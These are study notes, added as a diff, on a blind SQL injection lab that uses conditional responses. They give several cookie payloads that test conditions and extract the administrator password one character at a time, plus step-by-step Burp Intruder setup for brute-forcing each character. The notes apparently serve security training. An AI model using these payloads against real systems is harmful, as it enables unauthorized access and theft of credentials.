@@ -1,0 +1,12 @@
+	- Test cookie with conditional url encoded payload
+		○ TrackingId=SQzz8wnD8GTW4IWi'AND+'1'='1;
+	- Try  to find the password from the administrator account
+		○ TrackingId=SQzz8wnD8GTW4IWi'AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) > 'z
+	- Try to test sql injection
+		○ TrackingId=2bL1QH6Jmd2NjGDM'AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a;
+	- Use this payload to extract admin password
+		○ TrackingId=oZzDSsHxpLcQmbXf'AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a;
+	- How to setup in burp
+		○  Place payload position markers around the final a character in the cookie value. To do this, select just the a, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers): TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
+		○  To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down. 
+       To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back". 
